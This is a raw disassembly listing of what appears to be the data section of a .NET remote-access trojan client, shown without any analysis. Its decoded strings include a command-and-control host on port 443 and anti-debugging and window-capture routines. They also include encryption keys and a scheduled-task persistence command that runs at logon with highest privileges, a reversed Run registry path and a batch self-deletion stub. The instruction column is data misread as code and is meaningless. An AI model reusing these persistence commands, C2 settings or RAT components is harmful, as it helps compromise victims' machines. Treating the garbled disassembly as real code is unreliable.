  406e78:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  406e7f:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  406e86:	65 
  406e87:	43                   	inc    %ebx
  406e88:	6c                   	insb   (%dx),%es:(%edi)
  406e89:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  406e90:	74 5f                	je     0x406ef1
  406e92:	53                   	push   %ebx
  406e93:	73 6c                	jae    0x406f01
  406e95:	43                   	inc    %ebx
  406e96:	6c                   	insb   (%dx),%es:(%edi)
  406e97:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  406e9e:	74 5f                	je     0x406eff
  406ea0:	53                   	push   %ebx
  406ea1:	73 6c                	jae    0x406f0f
  406ea3:	43                   	inc    %ebx
  406ea4:	6c                   	insb   (%dx),%es:(%edi)
  406ea5:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  406eac:	74 5f                	je     0x406f0d
  406eae:	54                   	push   %esp
  406eaf:	63 70 43             	arpl   %esi,0x43(%eax)
  406eb2:	6c                   	insb   (%dx),%es:(%edi)
  406eb3:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  406eba:	74 5f                	je     0x406f1b
  406ebc:	54                   	push   %esp
  406ebd:	63 70 43             	arpl   %esi,0x43(%eax)
  406ec0:	6c                   	insb   (%dx),%es:(%edi)
  406ec1:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  406ec8:	74 68                	je     0x406f32
  406eca:	65 6e                	outsb  %gs:(%esi),(%dx)
  406ecc:	74 69                	je     0x406f37
  406ece:	63 61 74             	arpl   %esp,0x74(%ecx)
  406ed1:	65 41                	gs inc %ecx
  406ed3:	73 43                	jae    0x406f18
  406ed5:	6c                   	insb   (%dx),%es:(%edi)
  406ed6:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  406edd:	73 74                	jae    0x406f53
  406edf:	65 6d                	gs insl (%dx),%es:(%edi)
  406ee1:	2e 4d                	cs dec %ebp
  406ee3:	61                   	popa
  406ee4:	6e                   	outsb  %ds:(%esi),(%dx)
  406ee5:	61                   	popa
  406ee6:	67 65 6d             	gs insl (%dx),%es:(%di)
  406ee9:	65 6e                	outsb  %gs:(%esi),(%dx)
  406eeb:	74 00                	je     0x406eed
  406eed:	45                   	inc    %ebp
  406eee:	6e                   	outsb  %ds:(%esi),(%dx)
  406eef:	76 69                	jbe    0x406f5a
  406ef1:	72 6f                	jb     0x406f62
  406ef3:	6e                   	outsb  %ds:(%esi),(%dx)
  406ef4:	6d                   	insl   (%dx),%es:(%edi)
  406ef5:	65 6e                	outsb  %gs:(%esi),(%dx)
  406ef7:	74 00                	je     0x406ef9
  406ef9:	67 65 74 5f          	addr16 gs je 0x406f5c
  406efd:	43                   	inc    %ebx
  406efe:	75 72                	jne    0x406f72
  406f00:	72 65                	jb     0x406f67
  406f02:	6e                   	outsb  %ds:(%esi),(%dx)
  406f03:	74 00                	je     0x406f05
  406f05:	47                   	inc    %edi
  406f06:	65 74 43             	gs je  0x406f4c
  406f09:	75 72                	jne    0x406f7d
  406f0b:	72 65                	jb     0x406f72
  406f0d:	6e                   	outsb  %ds:(%esi),(%dx)
  406f0e:	74 00                	je     0x406f10
  406f10:	43                   	inc    %ebx
  406f11:	68 65 63 6b 52       	push   $0x526b6365
  406f16:	65 6d                	gs insl (%dx),%es:(%edi)
  406f18:	6f                   	outsl  %ds:(%esi),(%dx)
  406f19:	74 65                	je     0x406f80
  406f1b:	44                   	inc    %esp
  406f1c:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406f20:	67 65 72 50          	addr16 gs jb 0x406f74
  406f24:	72 65                	jb     0x406f8b
  406f26:	73 65                	jae    0x406f8d
  406f28:	6e                   	outsb  %ds:(%esi),(%dx)
  406f29:	74 00                	je     0x406f2b
  406f2b:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  406f32:	67 65 72 50          	addr16 gs jb 0x406f86
  406f36:	72 65                	jb     0x406f9d
  406f38:	73 65                	jae    0x406f9f
  406f3a:	6e                   	outsb  %ds:(%esi),(%dx)
  406f3b:	74 00                	je     0x406f3d
  406f3d:	67 65 74 5f          	addr16 gs je 0x406fa0
  406f41:	52                   	push   %edx
  406f42:	65 6d                	gs insl (%dx),%es:(%edi)
  406f44:	6f                   	outsl  %ds:(%esi),(%dx)
  406f45:	74 65                	je     0x406fac
  406f47:	45                   	inc    %ebp
  406f48:	6e                   	outsb  %ds:(%esi),(%dx)
  406f49:	64 50                	fs push %eax
  406f4b:	6f                   	outsl  %ds:(%esi),(%dx)
  406f4c:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  406f53:	5f                   	pop    %edi
  406f54:	43                   	inc    %ebx
  406f55:	6f                   	outsl  %ds:(%esi),(%dx)
  406f56:	75 6e                	jne    0x406fc6
  406f58:	74 00                	je     0x406f5a
  406f5a:	67 65 74 5f          	addr16 gs je 0x406fbd
  406f5e:	50                   	push   %eax
  406f5f:	72 6f                	jb     0x406fd0
  406f61:	63 65 73             	arpl   %esp,0x73(%ebp)
  406f64:	73 6f                	jae    0x406fd5
  406f66:	72 43                	jb     0x406fab
  406f68:	6f                   	outsl  %ds:(%esi),(%dx)
  406f69:	75 6e                	jne    0x406fd9
  406f6b:	74 00                	je     0x406f6d
  406f6d:	63 6f 75             	arpl   %ebp,0x75(%edi)
  406f70:	6e                   	outsb  %ds:(%esi),(%dx)
  406f71:	74 00                	je     0x406f73
  406f73:	47                   	inc    %edi
  406f74:	65 74 50             	gs je  0x406fc7
  406f77:	61                   	popa
  406f78:	74 68                	je     0x406fe2
  406f7a:	52                   	push   %edx
  406f7b:	6f                   	outsl  %ds:(%esi),(%dx)
  406f7c:	6f                   	outsl  %ds:(%esi),(%dx)
  406f7d:	74 00                	je     0x406f7f
  406f7f:	44                   	inc    %esp
  406f80:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  406f84:	70 74                	jo     0x406ffa
  406f86:	00 45 6e             	add    %al,0x6e(%ebp)
  406f89:	63 72 79             	arpl   %esi,0x79(%edx)
  406f8c:	70 74                	jo     0x407002
  406f8e:	00 50 61             	add    %dl,0x61(%eax)
  406f91:	72 61                	jb     0x406ff4
  406f93:	6d                   	insl   (%dx),%es:(%edi)
  406f94:	65 74 65             	gs je  0x406ffc
  406f97:	72 69                	jb     0x407002
  406f99:	7a 65                	jp     0x407000
  406f9b:	64 54                	fs push %esp
  406f9d:	68 72 65 61 64       	push   $0x64616572
  406fa2:	53                   	push   %ebx
  406fa3:	74 61                	je     0x407006
  406fa5:	72 74                	jb     0x40701b
  406fa7:	00 43 6f             	add    %al,0x6f(%ebx)
  406faa:	6e                   	outsb  %ds:(%esi),(%dx)
  406fab:	76 65                	jbe    0x407012
  406fad:	72 74                	jb     0x407023
  406faf:	00 46 61             	add    %al,0x61(%esi)
  406fb2:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  406fb9:	54 
  406fba:	6f                   	outsl  %ds:(%esi),(%dx)
  406fbb:	4c                   	dec    %esp
  406fbc:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  406fc3:	75 74                	jne    0x407039
  406fc5:	00 4d 6f             	add    %cl,0x6f(%ebp)
  406fc8:	76 65                	jbe    0x40702f
  406fca:	4e                   	dec    %esi
  406fcb:	65 78 74             	gs js  0x407042
  406fce:	00 53 79             	add    %dl,0x79(%ebx)
  406fd1:	73 74                	jae    0x407047
  406fd3:	65 6d                	gs insl (%dx),%es:(%edi)
  406fd5:	2e 54                	cs push %esp
  406fd7:	65 78 74             	gs js  0x40704e
  406fda:	00 47 65             	add    %al,0x65(%edi)
  406fdd:	74 57                	je     0x407036
  406fdf:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  406fe6:	78 74                	js     0x40705c
  406fe8:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  406fec:	74 00                	je     0x406fee
  406fee:	47                   	inc    %edi
  406fef:	65 74 46             	gs je  0x407038
  406ff2:	6f                   	outsl  %ds:(%esi),(%dx)
  406ff3:	72 65                	jb     0x40705a
  406ff5:	67 72 6f             	addr16 jb 0x407067
  406ff8:	75 6e                	jne    0x407068
  406ffa:	64 57                	fs push %edi
  406ffc:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  407003:	65 74 5f             	gs je  0x407065
  407006:	43                   	inc    %ebx
  407007:	72 65                	jb     0x40706e
  407009:	61                   	popa
  40700a:	74 65                	je     0x407071
  40700c:	4e                   	dec    %esi
  40700d:	6f                   	outsl  %ds:(%esi),(%dx)
  40700e:	57                   	push   %edi
  40700f:	69 6e 64 6f 77 00 43 	imul   $0x4300776f,0x64(%esi),%ebp
  407016:	6c                   	insb   (%dx),%es:(%edi)
  407017:	6f                   	outsl  %ds:(%esi),(%dx)
  407018:	73 65                	jae    0x40707f
  40701a:	4d                   	dec    %ebp
  40701b:	75 74                	jne    0x407091
  40701d:	65 78 00             	gs js  0x407020
  407020:	43                   	inc    %ebx
  407021:	72 65                	jb     0x407088
  407023:	61                   	popa
  407024:	74 65                	je     0x40708b
  407026:	4d                   	dec    %ebp
  407027:	75 74                	jne    0x40709d
  407029:	65 78 00             	gs js  0x40702c
  40702c:	44                   	inc    %esp
  40702d:	65 6c                	gs insb (%dx),%es:(%edi)
  40702f:	61                   	popa
  407030:	79 00                	jns    0x407032
  407032:	49                   	dec    %ecx
  407033:	6e                   	outsb  %ds:(%esi),(%dx)
  407034:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40703b:	65 
  40703c:	41                   	inc    %ecx
  40703d:	72 72                	jb     0x4070b1
  40703f:	61                   	popa
  407040:	79 00                	jns    0x407042
  407042:	54                   	push   %esp
  407043:	6f                   	outsl  %ds:(%esi),(%dx)
  407044:	41                   	inc    %ecx
  407045:	72 72                	jb     0x4070b9
  407047:	61                   	popa
  407048:	79 00                	jns    0x40704a
  40704a:	67 65 74 5f          	addr16 gs je 0x4070ad
  40704e:	4b                   	dec    %ebx
  40704f:	65 79 00             	gs jns 0x407052
  407052:	73 65                	jae    0x4070b9
  407054:	74 5f                	je     0x4070b5
  407056:	4b                   	dec    %ebx
  407057:	65 79 00             	gs jns 0x40705a
  40705a:	43                   	inc    %ebx
  40705b:	72 65                	jb     0x4070c2
  40705d:	61                   	popa
  40705e:	74 65                	je     0x4070c5
  407060:	53                   	push   %ebx
  407061:	75 62                	jne    0x4070c5
  407063:	4b                   	dec    %ebx
  407064:	65 79 00             	gs jns 0x407067
  407067:	44                   	inc    %esp
  407068:	65 6c                	gs insb (%dx),%es:(%edi)
  40706a:	65 74 65             	gs je  0x4070d2
  40706d:	53                   	push   %ebx
  40706e:	75 62                	jne    0x4070d2
  407070:	4b                   	dec    %ebx
  407071:	65 79 00             	gs jns 0x407074
  407074:	4f                   	dec    %edi
  407075:	70 65                	jo     0x4070dc
  407077:	6e                   	outsb  %ds:(%esi),(%dx)
  407078:	53                   	push   %ebx
  407079:	75 62                	jne    0x4070dd
  40707b:	4b                   	dec    %ebx
  40707c:	65 79 00             	gs jns 0x40707f
  40707f:	67 65 74 5f          	addr16 gs je 0x4070e2
  407083:	50                   	push   %eax
  407084:	75 62                	jne    0x4070e8
  407086:	6c                   	insb   (%dx),%es:(%edi)
  407087:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  40708e:	61                   	popa
  40708f:	75 74                	jne    0x407105
  407091:	68 4b 65 79 00       	push   $0x79654b
  407096:	6d                   	insl   (%dx),%es:(%edi)
  407097:	61                   	popa
  407098:	73 74                	jae    0x40710e
  40709a:	65 72 4b             	gs jb  0x4070e8
  40709d:	65 79 00             	gs jns 0x4070a0
  4070a0:	52                   	push   %edx
  4070a1:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4070a8:	4b 65 
  4070aa:	79 00                	jns    0x4070ac
  4070ac:	5f                   	pop    %edi
  4070ad:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  4070b1:	53                   	push   %ebx
  4070b2:	79 73                	jns    0x407127
  4070b4:	74 65                	je     0x40711b
  4070b6:	6d                   	insl   (%dx),%es:(%edi)
  4070b7:	2e 53                	cs push %ebx
  4070b9:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4070bd:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4070c4:	70 
  4070c5:	74 6f                	je     0x407136
  4070c7:	67 72 61             	addr16 jb 0x40712b
  4070ca:	70 68                	jo     0x407134
  4070cc:	79 00                	jns    0x4070ce
  4070ce:	41                   	inc    %ecx
  4070cf:	73 73                	jae    0x407144
  4070d1:	65 6d                	gs insl (%dx),%es:(%edi)
  4070d3:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4070d7:	41                   	inc    %ecx
  4070d8:	64 64 72 65          	fs fs jb 0x407141
  4070dc:	73 73                	jae    0x407151
  4070de:	46                   	inc    %esi
  4070df:	61                   	popa
  4070e0:	6d                   	insl   (%dx),%es:(%edi)
  4070e1:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  4070e8:	63 
  4070e9:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  4070ed:	79 00                	jns    0x4070ef
  4070ef:	67 65 74 5f          	addr16 gs je 0x407152
  4070f3:	53                   	push   %ebx
  4070f4:	79 73                	jns    0x407169
  4070f6:	74 65                	je     0x40715d
  4070f8:	6d                   	insl   (%dx),%es:(%edi)
  4070f9:	44                   	inc    %esp
  4070fa:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407101:	79 00                	jns    0x407103
  407103:	53                   	push   %ebx
  407104:	65 74 52             	gs je  0x407159
  407107:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40710e:	00 6f 
  407110:	70 5f                	jo     0x407171
  407112:	45                   	inc    %ebp
  407113:	71 75                	jno    0x40718a
  407115:	61                   	popa
  407116:	6c                   	insb   (%dx),%es:(%edi)
  407117:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40711e:	49 
  40711f:	6e                   	outsb  %ds:(%esi),(%dx)
  407120:	65 71 75             	gs jno 0x407198
  407123:	61                   	popa
  407124:	6c                   	insb   (%dx),%es:(%edi)
  407125:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  40712c:	74 
  40712d:	65 6d                	gs insl (%dx),%es:(%edi)
  40712f:	2e 4e                	cs dec %esi
  407131:	65 74 2e             	gs je  0x407162
  407134:	53                   	push   %ebx
  407135:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407139:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  407140:	64 
  407141:	6f                   	outsl  %ds:(%esi),(%dx)
  407142:	77 73                	ja     0x4071b7
  407144:	49                   	dec    %ecx
  407145:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407148:	74 69                	je     0x4071b3
  40714a:	74 79                	je     0x4071c5
  40714c:	00 49 73             	add    %cl,0x73(%ecx)
  40714f:	4e                   	dec    %esi
  407150:	75 6c                	jne    0x4071be
  407152:	6c                   	insb   (%dx),%es:(%edi)
  407153:	4f                   	dec    %edi
  407154:	72 45                	jb     0x40719b
  407156:	6d                   	insl   (%dx),%es:(%edi)
  407157:	70 74                	jo     0x4071cd
  407159:	79 00                	jns    0x40715b
  40715b:	00 00                	add    %al,(%eax)
  40715d:	0d 53 00 48 00       	or     $0x480053,%eax
  407162:	41                   	inc    %ecx
  407163:	00 32                	add    %dh,(%edx)
  407165:	00 35 00 36 00 00    	add    %dh,0x3600
  40716b:	07                   	pop    %es
  40716c:	34 00                	xor    $0x0,%al
  40716e:	34 00                	xor    $0x0,%al
  407170:	33 00                	xor    (%eax),%eax
  407172:	00 19                	add    %bl,(%ecx)
  407174:	68 00 69 00 38       	push   $0x38006900
  407179:	00 38                	add    %bh,(%eax)
  40717b:	00 62 00             	add    %ah,0x0(%edx)
  40717e:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  407182:	74 00                	je     0x407184
  407184:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407188:	6f                   	outsl  %ds:(%esi),(%dx)
  407189:	00 6d 00             	add    %ch,0x0(%ebp)
  40718c:	00 0d 30 00 2e 00    	add    %cl,0x2e0030
  407192:	35 00 2e 00 37       	xor    $0x37002e00,%eax
  407197:	00 42 00             	add    %al,0x0(%edx)
  40719a:	00 0b                	add    %cl,(%ebx)
  40719c:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4071a0:	6c                   	insb   (%dx),%es:(%edi)
  4071a1:	00 73 00             	add    %dh,0x0(%ebx)
  4071a4:	65 00 00             	add    %al,%gs:(%eax)
  4071a7:	0f 41 00             	cmovno (%eax),%eax
  4071aa:	70 00                	jo     0x4071ac
  4071ac:	70 00                	jo     0x4071ae
  4071ae:	44                   	inc    %esp
  4071af:	00 61 00             	add    %ah,0x0(%ecx)
  4071b2:	74 00                	je     0x4071b4
  4071b4:	61                   	popa
  4071b5:	00 00                	add    %al,(%eax)
  4071b7:	11 54 00 65          	adc    %edx,0x65(%eax,%eax,1)
  4071bb:	00 73 00             	add    %dh,0x0(%ebx)
  4071be:	74 00                	je     0x4071c0
  4071c0:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4071c4:	78 00                	js     0x4071c6
  4071c6:	65 00 00             	add    %al,%gs:(%eax)
  4071c9:	11 4e 00             	adc    %ecx,0x0(%esi)
  4071cc:	59                   	pop    %ecx
  4071cd:	00 41 00             	add    %al,0x0(%ecx)
  4071d0:	4e                   	dec    %esi
  4071d1:	00 20                	add    %ah,(%eax)
  4071d3:	00 43 00             	add    %al,0x0(%ebx)
  4071d6:	41                   	inc    %ecx
  4071d7:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  4071db:	0b 25 00 4d 00 54    	or     0x54004d00,%esp
  4071e1:	00 58 00             	add    %bl,0x0(%eax)
  4071e4:	25 00 00 1b 25       	and    $0x251b0000,%eax
  4071e9:	00 43 00             	add    %al,0x0(%ebx)
  4071ec:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4071f0:	74 00                	je     0x4071f2
  4071f2:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  4071f8:	63 00                	arpl   %eax,(%eax)
  4071fa:	61                   	popa
  4071fb:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4071ff:	00 25 00 00 23 25    	add    %ah,0x25230000
  407205:	00 53 00             	add    %dl,0x0(%ebx)
  407208:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40720c:	76 00                	jbe    0x40720e
  40720e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407212:	73 00                	jae    0x407214
  407214:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  40721a:	61                   	popa
  40721b:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40721f:	00 72 00             	add    %dh,0x0(%edx)
  407222:	65 00 25 00 00 09 6e 	add    %ah,%gs:0x6e090000
  407229:	00 75 00             	add    %dh,0x0(%ebp)
  40722c:	6c                   	insb   (%dx),%es:(%edi)
  40722d:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  407231:	03 30                	add    (%eax),%esi
  407233:	00 00                	add    %al,(%eax)
  407235:	0b 44 00 65          	or     0x65(%eax,%eax,1),%eax
  407239:	00 62 00             	add    %ah,0x0(%edx)
  40723c:	75 00                	jne    0x40723e
  40723e:	67 00 00             	add    %al,(%bx,%si)
  407241:	01 00                	add    %eax,(%eax)
  407243:	03 3a                	add    (%edx),%edi
  407245:	00 00                	add    %al,(%eax)
  407247:	15 43 00 6f 00       	adc    $0x6f0043,%eax
  40724c:	6e                   	outsb  %ds:(%esi),(%dx)
  40724d:	00 6e 00             	add    %ch,0x0(%esi)
  407250:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407254:	74 00                	je     0x407256
  407256:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  40725b:	00 00                	add    %al,(%eax)
  40725d:	1b 44 00 69          	sbb    0x69(%eax,%eax,1),%eax
  407261:	00 73 00             	add    %dh,0x0(%ebx)
  407264:	63 00                	arpl   %eax,(%eax)
  407266:	6f                   	outsl  %ds:(%esi),(%dx)
  407267:	00 6e 00             	add    %ch,0x0(%esi)
  40726a:	6e                   	outsb  %ds:(%esi),(%dx)
  40726b:	00 65 00             	add    %ah,0x0(%ebp)
  40726e:	63 00                	arpl   %eax,(%eax)
  407270:	74 00                	je     0x407272
  407272:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  407277:	00 00                	add    %al,(%eax)
  407279:	2d 2f 00 2f 00       	sub    $0x2f002f,%eax
  40727e:	2f                   	das
  40727f:	00 20                	add    %ah,(%eax)
  407281:	00 43 00             	add    %al,0x0(%ebx)
  407284:	6c                   	insb   (%dx),%es:(%edi)
  407285:	00 69 00             	add    %ch,0x0(%ecx)
  407288:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40728c:	74 00                	je     0x40728e
  40728e:	20 00                	and    %al,(%eax)
  407290:	42                   	inc    %edx
  407291:	00 75 00             	add    %dh,0x0(%ebp)
  407294:	66 00 66 00          	data16 add %ah,0x0(%esi)
  407298:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40729c:	73 00                	jae    0x40729e
  40729e:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  4072a4:	20 00                	and    %al,(%eax)
  4072a6:	00 17                	add    %dl,(%edi)
  4072a8:	20 00                	and    %al,(%eax)
  4072aa:	42                   	inc    %edx
  4072ab:	00 79 00             	add    %bh,0x0(%ecx)
  4072ae:	74 00                	je     0x4072b0
  4072b0:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4072b4:	20 00                	and    %al,(%eax)
  4072b6:	20 00                	and    %al,(%eax)
  4072b8:	2f                   	das
  4072b9:	00 2f                	add    %ch,(%edi)
  4072bb:	00 2f                	add    %ch,(%edi)
  4072bd:	00 00                	add    %al,(%eax)
  4072bf:	17                   	pop    %ss
  4072c0:	73 00                	jae    0x4072c2
  4072c2:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4072c6:	64 00 20             	add    %ah,%fs:(%eax)
  4072c9:	00 63 00             	add    %ah,0x0(%ebx)
  4072cc:	68 00 75 00 6e       	push   $0x6e007500
  4072d1:	00 6b 00             	add    %ch,0x0(%ebx)
  4072d4:	73 00                	jae    0x4072d6
  4072d6:	00 0d 50 00 61 00    	add    %cl,0x610050
  4072dc:	63 00                	arpl   %eax,(%eax)
  4072de:	6b 00 65             	imul   $0x65,(%eax),%eax
  4072e1:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4072e5:	09 50 00             	or     %edx,0x0(%eax)
  4072e8:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4072ee:	00 0f                	add    %cl,(%edi)
  4072f0:	4d                   	dec    %ebp
  4072f1:	00 65 00             	add    %ah,0x0(%ebp)
  4072f4:	73 00                	jae    0x4072f6
  4072f6:	73 00                	jae    0x4072f8
  4072f8:	61                   	popa
  4072f9:	00 67 00             	add    %ah,0x0(%edi)
  4072fc:	65 00 00             	add    %al,%gs:(%eax)
  4072ff:	07                   	pop    %es
  407300:	63 00                	arpl   %eax,(%eax)
  407302:	6d                   	insl   (%dx),%es:(%edi)
  407303:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  407307:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40730d:	00 73 00             	add    %dh,0x0(%ebx)
  407310:	63 00                	arpl   %eax,(%eax)
  407312:	68 00 74 00 61       	push   $0x61007400
  407317:	00 73 00             	add    %dh,0x0(%ebx)
  40731a:	6b 00 73             	imul   $0x73,(%eax),%eax
  40731d:	00 20                	add    %ah,(%eax)
  40731f:	00 2f                	add    %ch,(%edi)
  407321:	00 63 00             	add    %ah,0x0(%ebx)
  407324:	72 00                	jb     0x407326
  407326:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40732a:	74 00                	je     0x40732c
  40732c:	65 00 20             	add    %ah,%gs:(%eax)
  40732f:	00 2f                	add    %ch,(%edi)
  407331:	00 66 00             	add    %ah,0x0(%esi)
  407334:	20 00                	and    %al,(%eax)
  407336:	2f                   	das
  407337:	00 73 00             	add    %dh,0x0(%ebx)
  40733a:	63 00                	arpl   %eax,(%eax)
  40733c:	20 00                	and    %al,(%eax)
  40733e:	6f                   	outsl  %ds:(%esi),(%dx)
  40733f:	00 6e 00             	add    %ch,0x0(%esi)
  407342:	6c                   	insb   (%dx),%es:(%edi)
  407343:	00 6f 00             	add    %ch,0x0(%edi)
  407346:	67 00 6f 00          	add    %ch,0x0(%bx)
  40734a:	6e                   	outsb  %ds:(%esi),(%dx)
  40734b:	00 20                	add    %ah,(%eax)
  40734d:	00 2f                	add    %ch,(%edi)
  40734f:	00 72 00             	add    %dh,0x0(%edx)
  407352:	6c                   	insb   (%dx),%es:(%edi)
  407353:	00 20                	add    %ah,(%eax)
  407355:	00 68 00             	add    %ch,0x0(%eax)
  407358:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40735e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407362:	74 00                	je     0x407364
  407364:	20 00                	and    %al,(%eax)
  407366:	2f                   	das
  407367:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40736b:	00 20                	add    %ah,(%eax)
  40736d:	00 22                	add    %ah,(%edx)
  40736f:	00 00                	add    %al,(%eax)
  407371:	11 22                	adc    %esp,(%edx)
  407373:	00 20                	add    %ah,(%eax)
  407375:	00 2f                	add    %ch,(%edi)
  407377:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40737b:	00 20                	add    %ah,(%eax)
  40737d:	00 27                	add    %ah,(%edi)
  40737f:	00 22                	add    %ah,(%edx)
  407381:	00 01                	add    %al,(%ecx)
  407383:	13 22                	adc    (%edx),%esp
  407385:	00 27                	add    %ah,(%edi)
  407387:	00 20                	add    %ah,(%eax)
  407389:	00 26                	add    %ah,(%esi)
  40738b:	00 20                	add    %ah,(%eax)
  40738d:	00 65 00             	add    %ah,0x0(%ebp)
  407390:	78 00                	js     0x407392
  407392:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  407398:	5c                   	pop    %esp
  407399:	00 6e 00             	add    %ch,0x0(%esi)
  40739c:	75 00                	jne    0x40739e
  40739e:	52                   	push   %edx
  40739f:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  4073a3:	00 6f 00             	add    %ch,0x0(%edi)
  4073a6:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  4073ac:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  4073b0:	74 00                	je     0x4073b2
  4073b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4073b3:	00 65 00             	add    %ah,0x0(%ebp)
  4073b6:	72 00                	jb     0x4073b8
  4073b8:	72 00                	jb     0x4073ba
  4073ba:	75 00                	jne    0x4073bc
  4073bc:	43                   	inc    %ebx
  4073bd:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  4073c1:	00 77 00             	add    %dh,0x0(%edi)
  4073c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4073c5:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  4073c9:	00 69 00             	add    %ch,0x0(%ecx)
  4073cc:	57                   	push   %edi
  4073cd:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  4073d1:	00 66 00             	add    %ah,0x0(%esi)
  4073d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4073d5:	00 73 00             	add    %dh,0x0(%ebx)
  4073d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4073d9:	00 72 00             	add    %dh,0x0(%edx)
  4073dc:	63 00                	arpl   %eax,(%eax)
  4073de:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  4073e4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4073e8:	61                   	popa
  4073e9:	00 77 00             	add    %dh,0x0(%edi)
  4073ec:	74 00                	je     0x4073ee
  4073ee:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4073f2:	53                   	push   %ebx
  4073f3:	00 00                	add    %al,(%eax)
  4073f5:	03 22                	add    (%edx),%esp
  4073f7:	00 00                	add    %al,(%eax)
  4073f9:	09 2e                	or     %ebp,(%esi)
  4073fb:	00 62 00             	add    %ah,0x0(%edx)
  4073fe:	61                   	popa
  4073ff:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  407403:	13 40 00             	adc    0x0(%eax),%eax
  407406:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40740a:	68 00 6f 00 20       	push   $0x20006f00
  40740f:	00 6f 00             	add    %ch,0x0(%edi)
  407412:	66 00 66 00          	data16 add %ah,0x0(%esi)
  407416:	00 1f                	add    %bl,(%edi)
  407418:	74 00                	je     0x40741a
  40741a:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  407420:	6f                   	outsl  %ds:(%esi),(%dx)
  407421:	00 75 00             	add    %dh,0x0(%ebp)
